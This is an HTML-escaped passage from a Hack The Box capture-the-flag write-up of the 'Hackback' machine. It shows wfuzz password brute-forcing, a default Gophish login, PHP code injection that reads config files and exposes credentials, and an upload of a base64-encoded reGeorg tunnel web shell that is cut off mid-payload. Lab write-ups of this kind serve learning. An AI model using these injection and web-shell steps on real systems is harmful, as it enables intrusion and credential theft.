2019/07/05 10:08:09 Starting gobuster
=====================================================
/webadmin.php (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-got-webadminphp-i-tried-again-and-now-i-didnt-get-a-redirect-&quot;&gt;Great we got &lt;code class=&quot;highlighter-rouge&quot;&gt;webadmin.php&lt;/code&gt;, I tried again and now I didn’t get a redirect :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=test&amp;amp;session='
Wrong secret key!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-i-got-wrong-secret-key-and-thats-expected-because-i-set-the-password-to-test-i-used-wfuzz-again-with-darkweb2017-top10000txt-from-seclists-to-bruteforce-the-password-which-happened-to-be-a-very-easy-one-&quot;&gt;But I got &lt;code class=&quot;highlighter-rouge&quot;&gt;Wrong secret key!&lt;/code&gt;, and that’s expected because I set the password to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; again with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt&quot;&gt;darkweb2017-top10000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to bruteforce the password which happened to be a very easy one :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=' -w darkweb2017-top10000.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        3 W           17 Ch        &quot;123456&quot;
000004:  C=302      0 L        3 W           17 Ch        &quot;password&quot;
000006:  C=302      0 L        3 W           17 Ch        &quot;abc123&quot;
000005:  C=302      0 L        3 W           17 Ch        &quot;qwerty&quot;
000007:  C=302      7 L       15 W          197 Ch        &quot;12345678&quot;
000008:  C=302      0 L        3 W           17 Ch        &quot;password1&quot;
000009:  C=302      0 L        3 W           17 Ch        &quot;1234567&quot;
000010:  C=302      0 L        3 W           17 Ch        &quot;123123&quot;
000002:  C=302      0 L        3 W           17 Ch        &quot;123456789&quot;
000003:  C=302      0 L        3 W           17 Ch        &quot;111111&quot;
000011:  C=302      0 L        3 W           17 Ch        &quot;1234567890&quot;
000012:  C=302      0 L        3 W           17 Ch        &quot;000000&quot;
000013:  C=302      0 L        3 W           17 Ch        &quot;12345&quot;
^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;12345678-gave-a-different-response-length-so-its-probably-the-password-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;12345678&lt;/code&gt; gave a different response length so it’s probably the password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session='
Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; 7cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log
    [3] =&amp;gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;yes-it-worked-i-added-my-phpsessid-cookie-with-the--b-option-and-i-also-added-it-to-session-because-some-stuff-didnt-work-without-including-the-session-cookie&quot;&gt;Yes it worked. I added my &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; cookie with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-b&lt;/code&gt; option and I also added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;session=&lt;/code&gt;, because some stuff didn’t work without including the session cookie.&lt;/h4&gt;
&lt;h4 id=&quot;list-showed-us-some-logs-i-tried-the-other-actions-exec-said-missing-command-but-i-couldnt-make-it-execute-anything-init-didnt-output-anything-but-most-likely-its-doing-something-that-doesnt-produce-an-output-also-show-didnt-result-in-any-output-but-we-will-make-it-do-soon&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; showed us some logs. I tried the other actions, &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; said &lt;code class=&quot;highlighter-rouge&quot;&gt;Missing command&lt;/code&gt; but I couldn’t make it execute anything. &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; didn’t output anything but most likely it’s doing something that doesn’t produce an output. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; didn’t result in any output but we will make it do soon.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gophish&quot;&gt;Gophish&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-full-nmap-scan-&quot;&gt;Let’s take a look at the full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -T5 -p- hackback.htb --max-retries 1 &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-another-3rd-port--64831-i-scanned-that-port-with-nmap-&quot;&gt;There’s another 3rd port : &lt;code class=&quot;highlighter-rouge&quot;&gt;64831&lt;/code&gt;. I scanned that port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC -p 64831 hackback.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-https-i-went-there-and-it-was-gophish-&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. I went there and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;gophish&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Gophish is a powerful, open-source phishing framework that makes it easy to test your organization’s exposure to phishing. -&lt;a href=&quot;https://getgophish.com/&quot;&gt;getgophish.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-tried-to-login-with-the-default-credentials--admin--gophish-and-it-worked-&quot;&gt;I tried to login with the default credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;admin : gophish&lt;/code&gt; and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-kinda-empty-but-i-found-some-email-templates-for-facebook-hackthebox-paypal-and-twitter&quot;&gt;It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-there-are-phishing-sites-somewhere-for-these-sites-and-now-we-can-understand-whats-happening-in-the-secret-path-its-an-endpoint-that-shows-the-collected-data-from-the-phishing-sites-i-created-a-small-list-to-search-for-hackthebox-phishing-site-&quot;&gt;So there are phishing sites somewhere for these sites and now we can understand what’s happening in the secret path. It’s an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hackthebox
hacktheboxeu
hackthebox.eu
htb
www.hackthebox
www.hacktheboxeu
www.hackthebox.eu
www.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-used-wfuzz-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -c -w list.txt -H &quot;HOST: FUZZ.htb&quot; http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://10.10.10.128/
Total requests: 9

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     33 L       54 W          614 Ch        &quot;hackthebox&quot;
000005:  C=200    102 L      345 W         4110 Ch        &quot;www.hackthebox&quot;
000008:  C=200     33 L       54 W          614 Ch        &quot;www.htb&quot;
000009:  C=400      6 L       26 W          334 Ch        &quot;&quot;
000006:  C=200     33 L       54 W          614 Ch        &quot;www.hacktheboxeu&quot;
000007:  C=200     33 L       54 W          614 Ch        &quot;www.hackthebox.eu&quot;
000002:  C=200     33 L       54 W          614 Ch        &quot;hacktheboxeu&quot;
000003:  C=200     33 L       54 W          614 Ch        &quot;hackthebox.eu&quot;
000004:  C=200     33 L       54 W          614 Ch        &quot;htb&quot;

Total time: 0.492524
Processed Requests: 9
Filtered Requests: 0
Requests/sec.: 18.27319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;wwwhackthebox-gave-a-different-response-length-so-its-the-right-one-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;www.hackthebox&lt;/code&gt; gave a different response length so it’s the right one. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/15.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.hackthebox.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/hackback/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;just-a-fake-hack-the-box-login-page-i-entered-test-credentials-&quot;&gt;Just a fake Hack The Box login page. I entered test credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-checked-the-secret-path-again-and-did-list-&quot;&gt;Then I checked the secret path again and did &lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-logs-increased-by-one-i-did-show-and-found-the-credentials-i-just-sent-&quot;&gt;The logs increased by one. I did &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; and found the credentials I just sent :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'                                                                                                        
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;php-code-injection-uploading-tunnel&quot;&gt;PHP Code Injection, Uploading Tunnel&lt;/h3&gt;
&lt;h4 id=&quot;with-a-functionality-like-this-there-might-be-some-injection-somewhere-after-some-attempts-i-tried-php-code-and-it-was-executed-&quot;&gt;With a functionality like this, there might be some injection somewhere. After some attempts I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code and it was executed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-username-is-empty-instead-of-printing-the-text-i-have-sent-which-means-that-it-got-executed-as-php-however-all-the-functions-we-would-use-to-get-rce-like-exec-and-system-are-disabled-so--no-we-wont-have-a-shell-now&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; is empty instead of printing the text I have sent, which means that it got executed as &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt;. However all the functions we would use to get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; like &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; are disabled so … no we won’t have a shell now.&lt;/h4&gt;
&lt;h4 id=&quot;i-wanted-to-list-the-files-in-the-current-directory-so-i-used-the-scandir-function-&quot;&gt;I wanted to list the files in the current directory so I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;scandir()&lt;/code&gt; function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('.')); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 05:06:37 PM] 10.10.xx.xx - Username: Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; index.html
    [3] =&amp;gt; webadmin.php
)
, Password: whatever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-up-one-directory-&quot;&gt;I went up one directory :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('..')); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; 2bb6916122f1da34dcd916421e531578
    [3] =&amp;gt; App_Data
    [4] =&amp;gt; aspnet_client
    [5] =&amp;gt; css
    [6] =&amp;gt; img
    [7] =&amp;gt; index.php
    [8] =&amp;gt; js
    [9] =&amp;gt; logs
    [10] =&amp;gt; web.config
    [11] =&amp;gt; web.config.old
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;webconfig-and-webconfigold-look-interesting-i-checked-them-and-in-webconfigold-i-found-some-credentials-i-used-the-file_get_contents-function-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; look interesting. I checked them and in &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; I found some credentials. I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_get_contents()&lt;/code&gt; function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php echo file_get_contents('../web.config.old'); ?&amp;gt;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;webconfigold-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;system.webServer&amp;gt;
        &amp;lt;authentication mode=&quot;Windows&quot;&amp;gt;
        &amp;lt;identity impersonate=&quot;true&quot;                 
            userName=&quot;simple&quot; 
            password=&quot;ZonoProprioZomaro:-(&quot;/&amp;gt;
     &amp;lt;/authentication&amp;gt;
        &amp;lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&amp;gt;
    &amp;lt;/system.webServer&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;credentials--simple--zonopropriozomaro--however-theres-no-place-to-use-these-credentials-i-went-back-to-the-http-port-6666-and-i-executed-netstat-i-found-that-winrm-was-running-internally-&quot;&gt;Credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;simple : ZonoProprioZomaro:-(&lt;/code&gt;. However there’s no place to use these credentials. I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port 6666 and I executed &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat&lt;/code&gt;. I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; was running internally :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;CimInstanceProperties&quot;:  [
                                      &quot;Caption&quot;,
                                      &quot;Description&quot;,
                                      &quot;ElementName&quot;,
                                      &quot;InstanceID = \&quot;::1??49852??::1??5985\&quot;&quot;,
                                      &quot;CommunicationStatus&quot;,
                                      &quot;DetailedStatus&quot;,
                                      &quot;HealthState&quot;,
                                      &quot;InstallDate&quot;,
                                      &quot;Name&quot;,
                                      &quot;OperatingStatus&quot;,
                                      &quot;OperationalStatus&quot;,
                                      &quot;PrimaryStatus&quot;,
                                      &quot;Status&quot;,
                                      &quot;StatusDescriptions&quot;,
                                      &quot;AvailableRequestedStates&quot;,
                                      &quot;EnabledDefault = 2&quot;,
                                      &quot;EnabledState&quot;,
                                      &quot;OtherEnabledState&quot;,
                                      &quot;RequestedState = 5&quot;,
                                      &quot;TimeOfLastStateChange&quot;,
                                      &quot;TransitioningToState = 12&quot;,
                                      &quot;AggregationBehavior&quot;,
                                      &quot;Directionality&quot;,
                                      &quot;CreationTime = 12/31/1600 4:00:00 PM&quot;,
                                      &quot;LocalAddress = \&quot;::1\&quot;&quot;,
                                      &quot;LocalPort = 49852&quot;,
                                      &quot;OwningProcess = 0&quot;,
                                      &quot;AppliedSetting = 6&quot;,
                                      &quot;OffloadState = 0&quot;,
                                      &quot;RemoteAddress = \&quot;::1\&quot;&quot;,
                                      &quot;RemotePort = 5985&quot;,
                                      &quot;State = 11&quot;
                                  ],	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-somehow-we-need-a-proxy-to-run-internally-and-make-us-able-to-connect-to-winrm-luckily-theres-regeorgsocksproxy&quot;&gt;So somehow we need a proxy to run internally and make us able to connect to &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt;. Luckily there’s &lt;a href=&quot;https://github.com/sensepost/reGeorg&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-downloaded-tunnelaspx-converted-it-to-base-64-then-i-uploaded-it-using-file_put_contents-and-base64_decode-&quot;&gt;I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;tunnel.aspx&lt;/code&gt;, converted it to &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; then I uploaded it using &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;base64_decode()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php file_put_contents(&quot;tunnel.aspx&quot;,base64_decode(&quot;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikK